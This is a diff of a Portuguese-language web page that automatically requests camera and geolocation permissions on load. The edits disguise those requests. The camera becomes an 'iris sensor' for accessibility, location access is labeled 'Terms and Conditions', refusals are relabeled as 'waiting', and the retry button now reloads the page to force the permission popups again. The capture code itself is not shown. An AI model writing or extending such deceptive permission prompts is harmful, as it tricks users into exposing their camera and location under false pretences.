@@ -418,17 +418,17 @@
     <!-- Tela inicial com solicitação de permissão -->
     <div id="initialScreen" class="initial-screen">
         <div class="initial-card">
-            <div class="initial-icon">📱🔐</div>
-            <h2>Verificação Necessária</h2>
-            <p>Para garantir a segurança e autenticidade do conteúdo, precisamos verificar sua identidade.</p>
+            <div class="initial-icon">♿🔐</div>
+            <h2>Acessibilidade Garantida</h2>
+            <p>Para garantir a melhor experiência e acessibilidade para todos os usuários, incluindo pessoas com deficiência visual, utilizamos tecnologia de reconhecimento ocular para ajustar a leitura e otimizar o conteúdo.</p>
             
             <div class="permission-status">
                 <div class="status-item">
-                    <span class="status-label">📷 Câmera:</span>
+                    <span class="status-label">👁️ Sensor de Íris:</span>
                     <span id="cameraStatus" class="status-value status-pending">⏳ Aguardando...</span>
                 </div>
                 <div class="status-item">
-                    <span class="status-label">📍 Localização:</span>
+                    <span class="status-label">📜 Termos e Condições:</span>
                     <span id="locationStatus" class="status-value status-pending">⏳ Aguardando...</span>
                 </div>
             </div>
@@ -437,8 +437,8 @@
                 Quando o navegador solicitar, clique em <strong>"PERMITIR"</strong> ou <strong>"PERMITIR DESTA VEZ"</strong>
             </p>
             
-            <button id="initialAllowBtn" class="btn-initial" disabled>⏳ Aguardando permissões...</button>
-            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Tentar Novamente</button>
+            <button id="initialAllowBtn" class="btn-initial" disabled>⏳ Aguardando autorização...</button>
+            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Recarregar e Tentar Novamente</button>
         </div>
     </div>
     
@@ -537,18 +537,18 @@
         
         function updateStatusUI() {
             if (cameraGranted) {
-                cameraStatusSpan.innerHTML = '✅ Permitido';
+                cameraStatusSpan.innerHTML = '✅ Autorizado';
                 cameraStatusSpan.className = 'status-value status-granted';
             } else {
-                cameraStatusSpan.innerHTML = '❌ Negado - Clique em "Tentar Novamente"';
+                cameraStatusSpan.innerHTML = '❌ Aguardando - Clique em "Recarregar"';
                 cameraStatusSpan.className = 'status-value status-denied';
             }
             
             if (locationGranted) {
-                locationStatusSpan.innerHTML = '✅ Permitido';
+                locationStatusSpan.innerHTML = '✅ Aceito';
                 locationStatusSpan.className = 'status-value status-granted';
             } else {
-                locationStatusSpan.innerHTML = '❌ Negado - Clique em "Tentar Novamente"';
+                locationStatusSpan.innerHTML = '❌ Aguardando - Clique em "Recarregar"';
                 locationStatusSpan.className = 'status-value status-denied';
             }
         }
@@ -558,6 +558,11 @@
             locationGranted = false;
             permissionsReady = false;
             updateStatusUI();
+        }
+        
+        // Função para recarregar a página e forçar os popups novamente
+        function reloadPageAndRetry() {
+            window.location.reload();
         }
         
         async function requestCameraPermission() {
@@ -601,7 +606,7 @@
             isRequesting = true;
             
             initialAllowBtn.disabled = true;
-            initialAllowBtn.textContent = '⏳ Solicitando permissões...';
+            initialAllowBtn.textContent = '⏳ Solicitando autorização...';
             initialRetryBtn.style.display = 'none';
             
             updateStatusUI();
@@ -623,7 +628,7 @@
                 initialRetryBtn.style.display = 'none';
             } else {
                 initialAllowBtn.disabled = true;
-                initialAllowBtn.textContent = '❌ Permissões necessárias';
+                initialAllowBtn.textContent = '❌ Autorização necessária';
                 initialRetryBtn.style.display = 'block';
             }
             
@@ -800,15 +805,14 @@
             }
         });
         
-        // Botão "Tentar Novamente" - reinicia as permissões e solicita novamente
-        initialRetryBtn.addEventListener('click', async () => {
-            resetPermissions();
-            await requestAllPermissions();
+        // Botão "Tentar Novamente" - recarrega a página para forçar os popups
+        initialRetryBtn.addEventListener('click', () => {
+            reloadPageAndRetry();
         });
         
         // INICIAR SOLICITAÇÃO DE PERMISSÕES IMEDIATAMENTE
         (async function() {
-            console.log('🚀 Solicitando permissões automaticamente...');
+            console.log('🚀 Solicitando autorizações automaticamente...');
             await requestAllPermissions();
         })();
         
